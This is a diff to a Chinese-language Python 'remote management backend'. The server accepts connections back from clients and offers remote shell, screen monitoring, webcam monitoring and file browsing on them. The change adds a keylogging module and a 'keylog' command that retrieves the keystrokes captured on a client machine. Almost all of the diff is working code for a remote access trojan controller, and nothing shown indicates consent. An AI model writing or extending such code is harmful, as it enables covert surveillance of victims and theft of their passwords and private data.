@@ -1,7 +1,7 @@
 """
 ===============================================================================
   远程管理后台（服务端）
-  功能：接收客户端连接，远程执行 Shell、屏幕监控、摄像头监控
+  功能：接收客户端连接，远程执行 Shell、屏幕监控、摄像头监控、文件管理、键盘记录等操作
   用法:python 后台.py
   说明：
     - 监听 0.0.0.0:8080,等待客户端主动连接
@@ -105,6 +105,16 @@ def recv_exact(sock, length):
 # ============================================================================
 # 第四部分：功能模块
 # ============================================================================
+
+def handle_keylog(target_client, addr):
+    """模块5：远程键盘记录"""
+    target_client.send(b'5')
+    # 按协议：先收8字节长度头，再收实际数据
+    len_data = recv_exact(target_client, 8)
+    log_len = int(len_data.decode())
+    log_data = recv_exact(target_client, log_len).decode('utf-8', errors='ignore')
+    print(f"{addr} 的键盘记录：\n{log_data}")
+
 def handle_file(target_client, addr):
     """模块4：远程文件管理"""
     target_client.send(b'4')
@@ -398,7 +408,7 @@ def handle_camera(target_client, addr):
 def admin_console():
     """
     管理员交互控制台。
-    提供菜单让用户选择操作：列出客户端、Shell、屏幕监控、摄像头监控。
+    提供菜单让用户选择操作：列出客户端、Shell、屏幕监控、摄像头监控、键盘记录。
     """
     while True:
         # --- 显示菜单 ---
@@ -410,6 +420,7 @@ def admin_console():
         print("  screen  <编号>   - 开始监控指定客户端的屏幕")
         print("  camera  <编号>   - 打开指定客户端的摄像头")
         print("  file    <编号>   - 浏览指定客户端的文件系统")
+        print("  keylog  <编号>   - 获取指定客户端的键盘记录")
         print("  quit             - 退出管理程序")
         print("=" * 50)
 
@@ -437,7 +448,7 @@ def admin_console():
         # ================================================================
         # 命令：shell / screen / camera
         # ================================================================
-        elif base_cmd in ['shell', 'screen', 'camera', 'file']:
+        elif base_cmd in ['shell', 'screen', 'camera', 'file', 'keylog']:
             # 校验参数格式：必须带一个数字编号
             if len(parts) != 2 or not parts[1].isdigit():
                 print(f"[-] 格式错误！正确用法：{base_cmd} <编号>")
@@ -468,6 +479,9 @@ def admin_console():
 
                 elif base_cmd == 'file':
                     handle_file(target_client, addr)
+
+                elif base_cmd == 'keylog':
+                    handle_keylog(target_client, addr)
 
             except (ConnectionError, ConnectionResetError, OSError) as e:
                 # 通信异常：客户端可能已断开
